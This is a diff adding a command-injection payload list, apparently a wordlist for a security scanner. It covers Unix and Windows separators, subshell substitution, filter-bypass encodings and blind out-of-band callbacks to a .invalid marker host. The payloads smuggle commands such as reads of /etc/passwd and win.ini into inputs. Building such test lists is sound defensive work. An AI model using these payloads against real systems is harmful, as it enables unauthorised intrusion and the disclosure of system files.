@@ -1,0 +1,119 @@
+# Command Injection payloads — OWASP A03:2021
+# Coverage: Unix/Linux, Windows, blind OOB, separator chaining, filter bypass
+# Marker: cmditest9b2f (used for output reflection detection)
+
+# ── Unix basic separators ─────────────────────────────────────────────────────
+;id
+;id;
+;id #
+| id
+|id
+|| id
+|| id #
+& id
+&& id
+`id`
+$(id)
+;whoami
+|whoami
+||whoami
+&whoami
+&&whoami
+;cat /etc/passwd
+|cat /etc/passwd
+;uname -a
+;hostname
+;ifconfig
+;ip a
+;ls /
+;pwd
+
+# ── Windows basic separators ──────────────────────────────────────────────────
+& whoami
+| whoami
+&& whoami
+|| whoami
+; whoami
+& dir
+| dir
+& ver
+| ver
+& type c:\windows\win.ini
+| type c:\windows\win.ini
+& systeminfo
+& ipconfig
+& hostname
+
+# ── Subshell / substitution ───────────────────────────────────────────────────
+$(id)
+`id`
+$(cat /etc/passwd)
+`cat /etc/passwd`
+$((1+1))
+${IFS}cat${IFS}/etc/passwd
+$(curl${IFS}http://cmditest9b2f.invalid/)
+
+# ── Blind OOB (DNS/HTTP callback — detection only) ────────────────────────────
+;ping -c 1 cmditest9b2f.invalid
+;curl http://cmditest9b2f.invalid/
+;wget http://cmditest9b2f.invalid/
+;nslookup cmditest9b2f.invalid
+|ping -c 1 cmditest9b2f.invalid
+|curl http://cmditest9b2f.invalid/
+&ping -c 1 cmditest9b2f.invalid
+& ping cmditest9b2f.invalid
+;ping -n 1 cmditest9b2f.invalid
+& nslookup cmditest9b2f.invalid
+
+# ── Blind time-based (sleep) ──────────────────────────────────────────────────
+;sleep 5
+| sleep 5
+|| sleep 5
+& sleep 5
+&& sleep 5
+;ping -c 5 127.0.0.1
+| ping -c 5 127.0.0.1
+;timeout 5
+& timeout 5
+& ping -n 5 127.0.0.1
+| ping -n 5 127.0.0.1
+$(sleep 5)
+`sleep 5`
+
+# ── Encoding / filter bypass ──────────────────────────────────────────────────
+;$@i$@d
+;w`h`o`a`m`i
+;who$()ami
+c\a\t /etc/passwd
+c"a"t /etc/passwd
+/???/??t /???/??ss??
+${PATH%%:*}/../bin/id
+;c${IFS}a${IFS}t${IFS}/etc/passwd
+%3Bid
+%7Cid
+%26id
+%60id%60
+%24%28id%29
+
+# ── Nested injection ─────────────────────────────────────────────────────────
+test;id;echo
+test|id|echo done
+1;2;id
+$($(id))
+`\`id\``
+;echo%20cmditest9b2f
+| echo cmditest9b2f
+&& echo cmditest9b2f
+
+# ── Argument injection ────────────────────────────────────────────────────────
+-h
+--help
+--version
+--debug
+-la
+../../etc/passwd
+/tmp/cmditest
+$HOME
+${HOME}
+%SYSTEMROOT%
+%COMSPEC%
